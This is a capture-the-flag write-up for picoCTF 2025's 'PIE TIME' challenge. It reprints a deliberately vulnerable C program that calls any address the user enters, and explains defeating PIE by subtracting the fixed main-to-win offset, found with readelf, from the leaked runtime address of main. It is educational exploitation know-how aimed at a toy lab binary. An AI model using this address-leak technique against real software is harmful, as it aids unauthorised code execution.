# PIE TIME - picoCTF 2025 Writeup

**Category:** Binary Exploitation  
**Difficulty:** Easy

## Description
Can you try to get the flag? Beware we have PIE!

## Approach
We are given a binary `vuln` and the source code `vuln.c`

The binary prints the address of `main`, then prompts you to enter an address. The program passes your input to a function pointer and calls it. A `SIGSEGV` handler exits on invalid jumps.

Looking at the source code, it is clear that our goal is to make the program call `win()` which prints the flag:

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

// Goal is to call this function
int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

Checking the securities on the binary:

```Bash
$ checksec vuln
[*] '/home/user/PIETIME/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
As implied by the challenge name, this binary is a Position-Independent Executable (PIE). PIE relocates the programâ€™s code segment at runtime (so absolute addresses change each run), but the relative offsets between functions (e.g., `main` and `win`) remain constant.

## Solution
The address of main is "leaked" to us on runtime, we can follow this approach:

Find the static symbol offsets (within the binary) for `main` and `win`

Use `readelf` or `objdump` to get symbol offsets
```Bash
$ readelf -s ./pietime | egrep " main| win"
    66: 00000000000012a7   150 FUNC    GLOBAL DEFAULT   16 win
    70: 000000000000133d   204 FUNC    GLOBAL DEFAULT   16 main
```
Compute the relative difference `delta = main_static - win_static`

```Python
# main_static - win_static = delta
0x133d - 0x12a7 = 0x96
```

At runtime, read the printed `main_runtime` and compute `win_runtime = main_runtime - delta`. Because `win` is at a lower static address than `main`, we will subtract this delta from the leaked `main` at runtime. 

Run the binary
```Bash
$ ./vuln
Address of main: 0x5660322e333d
Enter the address to jump to, ex => 0x12345:
```
Compute `win_runtime`
```Bash
win_runtime = 0x5660322e333d - 0x96 = 0x5660322e32a7
```

Send `win_runtime` to the program and it will call `win()` to print the flag
```Bash
You won!
picoCTF{...redacted...}
```
